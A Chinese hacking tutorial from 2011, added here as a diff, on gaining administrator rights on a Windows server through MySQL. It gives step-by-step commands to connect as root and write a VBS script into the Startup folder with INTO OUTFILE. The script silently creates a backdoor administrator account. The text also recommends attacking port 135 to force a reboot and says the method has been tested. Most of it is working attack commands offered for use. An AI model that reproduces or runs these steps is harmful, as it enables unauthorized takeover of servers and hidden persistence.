@@ -1,0 +1,49 @@
+mysql udf提权失败的另一种方法
+www.hx99.net    时间: 2011-02-21    阅读: 次     整理: 华西安全网
+实际操作中可以在webshell用udf.dll提权,用函数的上传文件功能上传文件到启动目录,再用shut函数重起系统.(目前没成功过,有机会本地测试一下,先记录在这了).如果是英文版的系统,启动目录在 "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup"
+
+
+1、连接到对方MYSQL 服务器
+mysql -u root -h 192.168.0.1
+mysql.exe 这个程序在你安装了MYSQL的的BIN目录中
+
+
+2、让我们来看看服务器中有些什么数据库
+mysql>show databases;
+MYSQL默认安装时会有MYSQL、TEST这两个数据库，如果你看到有其它的数据库那么就是用户自建的数据库。
+
+
+3、让我们进入数据库
+mysql>use test;
+我们将会进入test数据库中
+
+
+4、查看我们进入数据库中有些什么数据表
+mysql>show tables;
+默认的情况下，test中没有任何表的存在。
+以下为关键的部分
+
+
+5、在TEST数据库下创建一个新的表；
+mysql>create table a (cmd text);
+好了，我们创建了一个新的表，表名为a，表中只存放一个字段，字段名为cmd，为text文本。
+
+
+6、在表中插入内容
+mysql>insert into a values ("set wshshell=createobject (""wscript.shell"" ) " );
+mysql>insert into a values ("a=wshshell.run (""cmd.exe /c net user 1 1/add"",0) " );
+mysql>insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup Administrators 1 /add"",0) " );
+注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个VBS的脚本程序！
+
+
+7、好了，现在我们来看看表a中有些什么
+mysql>select * from a;
+我们将会看到表中有三行数据，就是我们刚刚输入的内容，确认你输入的内容无误后，我们来到下一步
+
+
+8、输出表为一个VBS的脚本文件
+mysql>select * from a into outfile "c:\\docume~1\\alluse~1\\「开始」菜单\\程序\\启动\\a.vbs"; 我们把我们表中的内容输入到启动组中，是一个VBS的脚本文件！注意“\"符号。
+
+
+9、看到这大家肯定知道了，就是利用MYSQL输出一个可执行的文件而已。为什么不用BAT呢，因为启动运行时会有明显的dos窗口出来，而用VBS脚本则可以完全隐藏窗口且不会有错误提示！本来，应该还有一句完成脚本后自动删除此脚本的，但是中文目录实在无法处理，只有作罢！好了，找个工具攻击135让服务器重启吧，几分钟以后你就是管理员了。 以测试 可以成功。
+
